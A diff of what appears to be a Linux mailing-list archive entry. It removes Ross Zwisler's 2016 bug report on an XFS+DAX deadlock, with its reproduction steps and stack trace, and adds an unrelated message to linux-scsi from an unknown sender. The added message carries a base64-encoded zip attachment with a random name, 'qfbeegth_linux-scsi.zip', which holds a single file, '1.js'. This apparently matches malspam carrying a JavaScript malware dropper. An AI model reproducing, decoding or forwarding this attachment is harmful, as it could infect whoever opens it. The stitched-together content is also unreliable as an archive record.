@@ -1,92 +1,60 @@
-From: Ross Zwisler <zwisler@gmail.com>
-Subject: Re: [PATCH 37/45] drivers: use req op accessor
-Date: Wed, 3 Aug 2016 16:33:15 -0600
-Message-ID: <CAOxpaSUMsgfTYsL0bL6VCnwxz7bpgpKO-ZfC5J8dFG9PN-hzvg@mail.gmail.com>
-References: <1465155145-10812-1-git-send-email-mchristi@redhat.com> <1465155145-10812-38-git-send-email-mchristi@redhat.com>
+From: <nelcastellodicarta@gmail.com>
+Subject: RE: linux-scsi
+Date: Wed, 3 Aug 2016 19:16:14 -0400
+Message-ID: <000101d1ee0f$4e9b7f3e$c0a80001@routit.net>
+Reply-To: <linux-scsi@vger.kernel.org>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
-Return-path: <linux-bcache-owner@vger.kernel.org>
-In-Reply-To: <1465155145-10812-38-git-send-email-mchristi@redhat.com>
-Sender: linux-bcache-owner@vger.kernel.org
-To: Mike Christie <mchristi@redhat.com>, Ross Zwisler <ross.zwisler@linux.intel.com>, Dave Chinner <david@fromorbit.com>, axboe@fb.com
-Cc: linux-f2fs-devel@lists.sourceforge.net, linux-ext4 <linux-ext4@vger.kernel.org>, konrad.wilk@oracle.com, drbd-dev@lists.linbit.com, philipp.reisner@linbit.com, lars.ellenberg@linbit.com, linux-raid@vger.kernel.org, dm-devel@redhat.com, linux-fsdevel <linux-fsdevel@vger.kernel.org>, linux-bcache@vger.kernel.org, linux-block@vger.kernel.org, LKML <linux-kernel@vger.kernel.org>, linux-scsi@vger.kernel.org, linux-mtd@lists.infradead.org, target-devel@vger.kernel.org, linux-btrfs@vger.kernel.org, osd-dev@open-osd.org, XFS Developers <xfs@oss.sgi.com>, ocfs2-devel@oss.oracle.com
+Content-Type: application/zip; name="qfbeegth_linux-scsi.zip"
+Content-Transfer-Encoding: base64
+Return-path: <linux-scsi-owner@vger.kernel.org>
+Received: from rt180bb44-46-82.routit.net ([46.44.180.82]:55350 "HELO
+	routit.net" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+	id S1758388AbcHCXQO (ORCPT <rfc822;linux-scsi@vger.kernel.org>);
+	Wed, 3 Aug 2016 19:16:14 -0400
+Content-Disposition: attachment
+Sender: linux-scsi-owner@vger.kernel.org
 List-Id: linux-scsi@vger.kernel.org
+To: linux-scsi <linux-scsi@vger.kernel.org>
 
-On Sun, Jun 5, 2016 at 1:32 PM,  <mchristi@redhat.com> wrote:
-> From: Mike Christie <mchristi@redhat.com>
->
-> The req operation REQ_OP is separated from the rq_flag_bits
-> definition. This converts the block layer drivers to
-> use req_op to get the op from the request struct.
->
-> Signed-off-by: Mike Christie <mchristi@redhat.com>
-> ---
->  drivers/block/loop.c              |  6 +++---
->  drivers/block/mtip32xx/mtip32xx.c |  2 +-
->  drivers/block/nbd.c               |  2 +-
->  drivers/block/rbd.c               |  4 ++--
->  drivers/block/xen-blkfront.c      |  8 +++++---
->  drivers/ide/ide-floppy.c          |  2 +-
->  drivers/md/dm.c                   |  2 +-
->  drivers/mmc/card/block.c          |  7 +++----
->  drivers/mmc/card/queue.c          |  6 ++----
-
-Dave Chinner reported a deadlock with XFS + DAX, which I reproduced
-and bisected to this commit:
-
-commit c2df40dfb8c015211ec55f4b1dd0587f875c7b34
-Author: Mike Christie <mchristi@redhat.com>
-Date:   Sun Jun 5 14:32:17 2016 -0500
-drivers: use req op accessor
-
-Here are the steps to reproduce the deadlock with a BRD ramdisk:
-
-mkfs.xfs -f /dev/ram0
-mount -o dax /dev/ram0 /mnt/scratch
-xfs_io -f -c "truncate 1g" /mnt/scratch/test.img
-losetup -f --show /mnt/scratch/test.img
-mkfs.xfs -f /dev/loop0
-
-At this point the mkfs.xfs deadlocks.  Here is the stack trace
-gathered via "echo w > /proc/sysrq-trigger" and passed through
-kasan_symbolize.py:
-
-brd: module loaded
-XFS (ram0): DAX enabled. Warning: EXPERIMENTAL, use at your own risk
-XFS (ram0): Mounting V5 Filesystem
-XFS (ram0): Ending clean mount
-sysrq: SysRq : Show Blocked State
-  task                        PC stack   pid father
-mkfs.xfs        D ffff88060ae47b38     0  1482   1287 0x00000000
- ffff88060ae47b38 00000000000079e8 ffff880610fd8d98 ffff880036011a40
- ffff8800aa6dcec0 ffff88060ae48000 ffff880610fd8d80 7fffffffffffffff
- ffff8800aa6dcec0 00000000024000c0 ffff88060ae47b50 ffffffff81aca775
-Call Trace:
- [<ffffffff81aca775>] schedule+0x35/0x80 kernel/sched/core.c:3360
- [<ffffffff81acf431>] schedule_timeout+0x271/0x460 kernel/time/timer.c:1493
- [<ffffffff81ac9c34>] io_schedule_timeout+0xa4/0x110 kernel/sched/core.c:4969
- [<     inline     >] do_wait_for_common kernel/sched/completion.c:75
- [<     inline     >] __wait_for_common kernel/sched/completion.c:93
- [<     inline     >] wait_for_common_io kernel/sched/completion.c:107
- [<ffffffff81acb33f>] wait_for_completion_io+0xdf/0x120
-kernel/sched/completion.c:155
- [<ffffffff81573206>] submit_bio_wait+0x66/0x90 block/bio.c:870
- [<ffffffff81588016>] blkdev_issue_discard+0x86/0xc0 block/blk-lib.c:115
- [<ffffffff8158ea23>] blk_ioctl_discard+0xa3/0xd0 block/ioctl.c:221
- [<ffffffff8158f5da>] blkdev_ioctl+0x60a/0x9e0 block/ioctl.c:510
- [<ffffffff812bddb3>] block_ioctl+0x43/0x50 fs/block_dev.c:1714
- [<     inline     >] vfs_ioctl fs/ioctl.c:43
- [<ffffffff8128ec72>] do_vfs_ioctl+0xa2/0x6a0 fs/ioctl.c:674
- [<     inline     >] SYSC_ioctl fs/ioctl.c:689
- [<ffffffff8128f2e9>] SyS_ioctl+0x79/0x90 fs/ioctl.c:680
- [<ffffffff81ad0abc>] entry_SYSCALL_64_fastpath+0x1f/0xbd
-arch/x86/entry/entry_64.S:207
-
-The line numbers are for the commit above, not for linux/master.  This
-occurs 100% as of this commit, and 0% with the previous commit.
-
-This doesn't occur if you don't use DAX, but based on the content of
-the commit I'm guessing that difference is due to variations in the
-way the two paths use discard.
-
-- Ross
+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
+AAEAAQBWAAAAxAgAAAAA
